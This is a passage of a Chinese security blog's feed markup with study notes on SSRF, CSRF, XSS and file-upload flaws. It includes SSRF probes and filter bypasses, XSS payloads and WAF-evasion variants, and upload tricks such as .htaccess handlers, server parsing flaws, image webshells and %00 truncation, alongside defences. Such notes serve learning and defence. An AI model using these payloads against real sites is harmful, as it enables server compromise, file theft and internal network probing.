class="line">转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</span><br></pre></td></tr></table></figure><h4 id="四-在线翻译"><a href="#四-在线翻译" class="headerlink" title="四.在线翻译"></a>四.在线翻译</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在线翻译：通过 URL地址翻译对应文本的内容。提供此功能的百度、有道</span><br><span class="line">等。有道翻译某处SSRF可通网易内网：</span><br><span class="line">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0198176.html</span><br></pre></td></tr></table></figure><h4 id="五-图片加载与下载"><a href="#五-图片加载与下载" class="headerlink" title="五.图片加载与下载"></a>五.图片加载与下载</h4><p>通过 URL地址加载或下载图片</p><p>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如</p><p>在有些公司中的加载自家图片服务器上的图片用于展示。</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/ShowImage.aspx?ImageUrl=http://www.a.com/a.jpg</span><br><span class="line">1）</span><br><span class="line">我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是</span><br><span class="line">http://www.a.com/a.jpg，（说明不存在SSRF漏洞。）</span><br><span class="line">http://www.baidu.com/uploads/2021080924.jpg  （不存在）</span><br><span class="line">2）</span><br><span class="line">可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含http://www.a.com/a.jpg这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</span><br><span class="line">3）</span><br><span class="line">在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</span><br><span class="line">http://127.0.0.1</span><br><span class="line">此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址</span><br></pre></td></tr></table></figure><h3 id="常见限制"><a href="#常见限制" class="headerlink" title="常见限制"></a>常见限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.限制为http://www.xxx.com 域名</span><br><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br><span class="line"></span><br><span class="line">2.限制请求IP不为内网地址</span><br><span class="line">当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">（2）采取特殊域名</span><br><span class="line">（3）采取进制转换</span><br><span class="line"></span><br><span class="line">3.限制请求只为http协议</span><br><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br></pre></td></tr></table></figure><h3 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h3><h4 id="http协议：探测内外主机存活、端口开放情况"><a href="#http协议：探测内外主机存活、端口开放情况" class="headerlink" title="http协议：探测内外主机存活、端口开放情况"></a>http协议：探测内外主机存活、端口开放情况</h4><p>​http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.localhost.com/ssrf.php?url=http://127.0.0.1</span><br></pre></td></tr></table></figure><h4 id="file协议：读取本地文件"><a href="#file协议：读取本地文件" class="headerlink" title="file协议：读取本地文件"></a>file协议：读取本地文件</h4><p>​file协议主要用于读取服务器本地文件，访问的是本地的静态资源</p><p>file对应的类似http的协议是ftp协议（文件传输协议） file不能跨域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://文件绝对路径</span><br><span class="line"></span><br><span class="line">www.localhost.com/ssrf.php?url=file://C://Windows/win.ini</span><br></pre></td></tr></table></figure><h4 id="ftp协议：端口扫描"><a href="#ftp协议：端口扫描" class="headerlink" title="ftp协议：端口扫描"></a>ftp协议：端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.localhost.com/ssrf.php?url=ftp://127.0.0.1:443//端口扫描</span><br></pre></td></tr></table></figure><h4 id="gopher协议：发送GET或POST请求；攻击内网应用，如redis、FastCGI"><a href="#gopher协议：发送GET或POST请求；攻击内网应用，如redis、FastCGI" class="headerlink" title="gopher协议：发送GET或POST请求；攻击内网应用，如redis、FastCGI"></a>gopher协议：发送GET或POST请求；攻击内网应用，如redis、FastCGI</h4><p>看我另一文章：<a href="https://www.jqsafe.top/2022/10/09/SSRF_gopher协议">SSRF——gopher协议</a></p><h4 id="dict协议：泄露安装版本信息，查看端口，操作内网redis访问"><a href="#dict协议：泄露安装版本信息，查看端口，操作内网redis访问" class="headerlink" title="dict协议：泄露安装版本信息，查看端口，操作内网redis访问"></a>dict协议：泄露安装版本信息，查看端口，操作内网redis访问</h4><p>看我另一文章：<a href="https://www.jqsafe.top/2022/10/10/SSRF_dict协议">SSRF——dict协议</a></p><h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@：</span><br><span class="line">http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">。:</span><br><span class="line">http://127.0.0.1与http://127 。 0 。 0 。 1 ,中文句号绕过,两个请求是相同的</span><br><span class="line"></span><br><span class="line">短网址绕过:</span><br><span class="line">http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group</span><br><span class="line"></span><br><span class="line">IP地址转换成十进制：</span><br><span class="line">127.0.0.1=2130706433  16进制也是可行的</span><br><span class="line">http://www.ab126.com/system/2859.html</span><br><span class="line"></span><br><span class="line">Xip.io</span><br><span class="line">127.0.0.1.xip.io  --127.0.0.1</span><br><span class="line">www.127.0.0.1.xip.io   --127.0.0.1</span><br><span class="line">Haha.127.0.0.1.xip.io  --127.0.0.1</span><br><span class="line">Haha.xixi.127.0.0.1.xip.io  --127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</span><br><span class="line"></span><br><span class="line">2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 </span><br><span class="line"></span><br><span class="line">3.黑名单内网IP。</span><br><span class="line"></span><br><span class="line">4.禁用不需要的协议，仅仅允许HTTP和HTTPS.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2022/10/07/CSRF/"/>
      <url>/2022/10/07/CSRF/</url>
      
        <content type="html"><![CDATA[<h3 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h3><p>是一种<strong>挟持用户</strong>在当前已经登录发Web应用程序上<strong>执行非本意的操作</strong>的攻击方法。</p><p>攻击者盗用了你在某个网站的身份，<strong>以你的名义发送恶意请求</strong>。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>以受害者的名义：发邮件、发消息、财产操作、新建文件、增删改查</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.登录账户，拥有cookie</p><p>2.保持登录</p><p>3.在同一个浏览器</p><p>4.点击恶意链接</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="挟持用户"><a href="#挟持用户" class="headerlink" title="挟持用户"></a>挟持用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其实我们不能挟持用户，但是我们可以挟持用户的浏览器发送任意的请求。</span><br><span class="line">某些html标签是可以发送HTTP GET类型的请求的。例如&lt;img&gt;</span><br><span class="line">&lt;img src=&quot;http://www.baidu.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">浏览器渲染img标签的时候，并不知道img标签中src属性的值，到底是不是一个图片，浏览器做的就是根据src中的链接，发起一个HTTP GET请求，并且携带上当前浏览器在目标网站上的凭证，也就是cookies，获取返回结果以图片的形式渲染</span><br><span class="line"></span><br><span class="line">根据这个特性，可以挟持用户的浏览器携带用户凭证(cookie)发送任意的请求</span><br></pre></td></tr></table></figure><h4 id="让用户执行非本意操作"><a href="#让用户执行非本意操作" class="headerlink" title="让用户执行非本意操作"></a>让用户执行非本意操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">其实用户所有进行的操作，比如发送短消息，转账操作，用户只是操作的浏览器，而浏览器通过发送HTTP请求，才是真正的跟Web应用程序交互的操作。</span><br><span class="line"></span><br><span class="line">用户浏览器发送出去的HTTP请求代表了，用户的操作</span><br><span class="line"></span><br><span class="line">可以通过抓包获取用户操作背后的HTTP请求</span><br><span class="line"></span><br><span class="line">修改HTTP请求的相关参数后，挟持受害者发送修改后的HTTP请求</span><br><span class="line"></span><br><span class="line">受害者在不知情的情况下完成了发送短消息或者转账等操作</span><br></pre></td></tr></table></figure><h3 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h3><p>冒充身份：订阅&#x2F;关注&#x2F;转发&#x2F;投票操作，删除文件，更改配置等</p><p>账户接管：密码修改，邮箱绑定，第三方账户关联</p><p>其他：登录、注册、注销</p><p>安全设计原则：浏览器CSRF令牌未更新、登出后未注销</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="从漏洞原理防御"><a href="#从漏洞原理防御" class="headerlink" title="从漏洞原理防御"></a>从漏洞原理防御</h4><p>手机验证码</p><p>Referer</p><p>Token</p><h4 id="从利用条件防御"><a href="#从利用条件防御" class="headerlink" title="从利用条件防御"></a>从利用条件防御</h4><p>访问完一个网站之后，点击退出账户</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞</title>
      <link href="/2022/10/07/XSS/"/>
      <url>/2022/10/07/XSS/</url>
      
        <content type="html"><![CDATA[<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">相同的协议+相同的域名+相同的端口号</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">https://www.baidu.com/t1</span><br><span class="line">https://www.baidu.com/t2</span><br><span class="line"></span><br><span class="line">部分标签在引用第三方资源时，不受同源策略的限制，如：</span><br><span class="line">&lt;script src=http://www.xxx.com&gt;&lt;/script&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><p>用户提交的数据没有过滤，或者过滤不严格，输出到网页中，导致可以构造执行JS代码，或者修改网页内容</p><h3 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h3><p>获取用户或者管理员的<strong>cookie</strong>(主要的)</p><p>XSS Worm</p><p>挂马（水坑攻击）</p><p>有局限性的键盘记录</p><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p>反射型XSS：不持久型的XSS漏洞</p><p>存储型XSS：持久型的XSS漏洞</p><p>DOM型XSS：document节点XSS漏洞</p><p>Flash XSS</p><p>PDF XSS</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>XSS代码出现在URL参数或请求中，浏览器发出请求时，参数值作为输入提交到服务器，服务器接受这个参数并处理后，参数值出现在象形的HTML中，最后浏览器解析执行了这段XSS代码</p><h4 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">| 标签               | 用法                              |</span><br><span class="line">| ----------------- | -----------------------------------|</span><br><span class="line">| &lt;script&gt;&lt;/script&gt; | &lt;script&gt;&#x27;XSS语句&#x27;&lt;/script&gt;          |</span><br><span class="line">| &lt;img&gt;             | &lt;img src=&quot;&quot; onerror=&#x27;XSS语句&#x27;&gt;      |</span><br><span class="line">| &lt;input&gt;           | &lt;input onfocus=&#x27;XSS语句&#x27; autofocus&gt; |</span><br><span class="line">| &lt;details&gt;         | &lt;details open ontoggle=&#x27;XSS语句&#x27;&gt;   |</span><br><span class="line">| &lt;svg&gt;             | &lt;svg onload=&#x27;XSS语句&#x27;&gt;              |</span><br><span class="line">| &lt;select&gt;&lt;/select&gt; | &lt;select onfocus=&#x27;XSS语句&#x27;&gt;&lt;/select&gt; |</span><br><span class="line">| &lt;iframe&gt;          |</span><br><span class="line">| &lt;link&gt; |</span><br></pre></td></tr></table></figure><h4 id="JS常用事件"><a href="#JS常用事件" class="headerlink" title="JS常用事件"></a>JS常用事件</h4><table><thead><tr><th>事件</th><th align="center">触发方法</th></tr></thead><tbody><tr><td>onmouseover</td><td align="center">鼠标移动到元素上时触发</td></tr><tr><td>onerror</td><td align="center">在视频&#x2F;音频数据加载期间发生错误时触发。</td></tr><tr><td>onclick</td><td align="center">元素上发生鼠标点击时触发</td></tr><tr><td>onload</td><td align="center">整个页面加载完以后执行</td></tr><tr><td>keydown</td><td align="center">下键按键松开后触发</td></tr><tr><td>keyup</td><td align="center">上键按键松开后触发</td></tr></tbody></table><h4 id="利用过程-可以考虑使用短链接"><a href="#利用过程-可以考虑使用短链接" class="headerlink" title="利用过程(可以考虑使用短链接)"></a>利用过程(可以考虑使用短链接)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.恶意的攻击者发给受害者一个链接(链接中携带xss代码)</span><br><span class="line">2.攻击者诱使受害者点开这个链接</span><br><span class="line">3.XSS代码被提交到有XSS漏洞的Web应用程序上</span><br><span class="line">4.web应用程序没有过滤提交上来的数据，或者过滤不严格</span><br><span class="line">5.web应用程序输出用户提交上来的数据(包含XSS代码)</span><br><span class="line">6.用户浏览器渲染返回的HTML页面，执行返回的JavaScript代码</span><br><span class="line">7.恶意的JavaScript代码悄悄执行，获取用户信息</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>又称为持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或者文件中，具有很高的隐蔽性</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>1.用户输入带有参数的URL或BODY域数据</p><p>2.服务器将参数存入数据库</p><p>3.通过JSON格式返回参数到页面</p><p>4.通过DOM调用参数进行排版</p><p>5.通过DOM动态输出到页面上</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.恶意的攻击者在存在XSS漏洞的网站提交一段XSS代码</span><br><span class="line">2.Web应用程序接受提交数据，没有过滤或者过滤不严格</span><br><span class="line">3.写入到数据库中或者文件中</span><br><span class="line">4.受害者访问这个存在XSS恶意代码的页面</span><br><span class="line">5.Web应用从数据库或者是从文件中读取之前的恶意攻击者提交的代码</span><br><span class="line">6.Web应用服务器返回这段数据</span><br><span class="line">7.受害者浏览渲染返回的HTML页面，执行返回的JavaScript代码</span><br><span class="line">8.恶意的JavaScript代码在后台悄悄进行，获取用户信息。</span><br></pre></td></tr></table></figure><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>对象模型，可以被认为是一种通过将页面元素以对象的树形方式表现，以便由JavaScript组织处理的实现方法，不与服务器进行交互</p><h4 id="常用的DOM方法"><a href="#常用的DOM方法" class="headerlink" title="常用的DOM方法"></a>常用的DOM方法</h4><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>getElementById()</td><td>返回带有指定ID的元素</td></tr><tr><td>getElementByTagName()</td><td>返回包含带有指定标签名称的所有元素的节点列表</td></tr><tr><td>getElementByClassName()</td><td>返回包含带有指定类名的所有元素的节点列表</td></tr><tr><td>appendChild()</td><td>把新的子节点添加到指定节点</td></tr><tr><td>removeChild()</td><td>删除子节点</td></tr><tr><td>replaceChild()</td><td>替换子节点</td></tr><tr><td>insertBefore()</td><td>在指定的子节点面前插入新的子节点</td></tr><tr><td>createAttribute()</td><td>创建属性节点</td></tr><tr><td>createElement()</td><td>创建元素节点</td></tr><tr><td>createTextNode()</td><td>创建文本节点</td></tr><tr><td>getAttribute()</td><td>返回指定的属性值</td></tr><tr><td>setattribute()</td><td>把指定属性设置或修改为指定的值</td></tr></tbody></table><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h4><p>htmlspecialchars($str, ENT_QUOTES)将预定义字符转成HTML实体，ENT_QUOTES是过滤全部引号</p><p>htmlentities()把字符转换为HTML实体</p><h4 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(alert)(1)</span><br><span class="line"></span><br><span class="line">a=alert,a(1)</span><br><span class="line"></span><br><span class="line">[1].find(alert)</span><br><span class="line"></span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](1)</span><br><span class="line"></span><br><span class="line">top[/al/.source+/ert/.source](1)</span><br><span class="line"></span><br><span class="line">al\u0065rt(1)</span><br><span class="line"></span><br><span class="line">top[&#x27;al\145rt&#x27;](1)</span><br><span class="line"></span><br><span class="line">top[8680439..toString(30)](2) </span><br><span class="line"></span><br><span class="line">javascript:alert`1`</span><br><span class="line"></span><br><span class="line">大小写rao&#x27;guo</span><br><span class="line"></span><br><span class="line">双写</span><br></pre></td></tr></table></figure><h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,base64编码后的内容</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,base64编码后的内容&quot;&gt;111&lt;/a&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传——扩展手段</title>
      <link href="/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E6%89%A9%E5%B1%95%E6%89%8B%E6%AE%B5/"/>
      <url>/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E6%89%A9%E5%B1%95%E6%89%8B%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="扩展手段"><a href="#扩展手段" class="headerlink" title="扩展手段"></a>扩展手段</h2><h3 id="htaccess攻击（分布式配置文件）"><a href="#htaccess攻击（分布式配置文件）" class="headerlink" title=".htaccess攻击（分布式配置文件）"></a>.htaccess攻击（分布式配置文件）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前提条件：  mod_rewrite 模块开启        AllowOverride All</span><br><span class="line"></span><br><span class="line">先上传.htaccess文件</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;前缀&quot;&gt;//指定前缀</span><br><span class="line">SetHandler application/x-httpd-php//指定解析格式</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">再上传 前缀.jpg木马文件，会自动解析成php文件</span><br></pre></td></tr></table></figure><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.若目录名以&#x27;.asp、.asa、.cer、.cdx&#x27;等字符结尾，那这个目录下的所有文件都会按照asp格式去解析</span><br><span class="line">test.asp/1.jpg</span><br><span class="line"></span><br><span class="line">2.文件名中含有&#x27;.asp;.asa;.cer;.cdx;&#x27;，会优先按asp来解析，如test.asp;.php//原理是服务器默认不解析;号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure><h3 id="IIS7-x解析漏洞"><a href="#IIS7-x解析漏洞" class="headerlink" title="IIS7.x解析漏洞"></a>IIS7.x解析漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</span><br></pre></td></tr></table></figure><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从右往左读取，读到认识的就可以执行</span><br><span class="line">例如：test.php.xxx</span><br></pre></td></tr></table></figure><h3 id="Nginx-lt-8-0-3解析漏洞"><a href="#Nginx-lt-8-0-3解析漏洞" class="headerlink" title="Nginx&lt;8.0.3解析漏洞"></a>Nginx&lt;8.0.3解析漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如test.jpg，可以添加为test.jpg/x.php进行解析</span><br><span class="line"></span><br><span class="line">防御：</span><br><span class="line">1、将php.ini文件中的cgi.fix_pathinfo的值设置为1</span><br><span class="line">2、将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设置为.php</span><br></pre></td></tr></table></figure><h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">文件头检测绕过：</span><br><span class="line">将图片头部格式放在上传文件头部即可绕过。（不动头尾，只修改中间内容）</span><br><span class="line">jpg: FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF: 47 49 46 38 39 61 (GIF89a)</span><br><span class="line">PNG: 89 50 4E 47</span><br><span class="line">图片马绕过：</span><br><span class="line">将恶意程序嵌入图片中，构成图片马，制作如下：</span><br><span class="line">方法一：cmd下执行</span><br><span class="line">copy /b 1.jpg+2.php=3.jpg</span><br><span class="line">方法二：文本方式打开图片直接粘贴一句话木马</span><br><span class="line">方法三：16进制打开图片在模为添加一句话木马</span><br></pre></td></tr></table></figure><h3 id="条件竞争漏洞-多文件上传"><a href="#条件竞争漏洞-多文件上传" class="headerlink" title="条件竞争漏洞(多文件上传)"></a>条件竞争漏洞(多文件上传)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原理：代码存在条件竞争问题，非法文件上传后会先保存在upload目录下，然后调用unlink函数进行删除，在这中间时间差里，我们可以不断上传和访问非法文件，只要速度快就可以触发成功</span><br><span class="line">步骤：</span><br><span class="line">1.写入自动写入文件：file_out_contents(&#x27;文件名&#x27;,&#x27;内容&#x27;)</span><br><span class="line">2.先抓正常上传的包</span><br><span class="line">3.再构造上传成功后的url：http://127.0.0.1/upload/info.php,抓假设已经上传了的包</span><br><span class="line">4.然后设置相同的请求次数和爆破线程，在bp同时进行跑包</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传——白名单绕过</title>
      <link href="/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
      <url>/2022/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0_%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>文件名后缀%00截断绕过、PHP文件包含漏洞</p><p>IIS解析漏洞、Nginx解析漏洞、Put协议上传</p><h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提条件： （1）php版本小于5.3.4       （2）php的magic_quotes_gpc(全局GPC)为OFF状态</span><br><span class="line"></span><br><span class="line">GET方式：bp抓包后修改为 test.php%00.jpg</span><br><span class="line"></span><br><span class="line">POST方式：bp抓包后修改HEX(16进制)的数据，在php后插入00</span><br></pre></td></tr></table></figure><h3 id="利用文件包含漏洞"><a href="#利用文件包含漏洞" class="headerlink" title="利用文件包含漏洞"></a>利用文件包含漏洞</h3><figure class="highlight 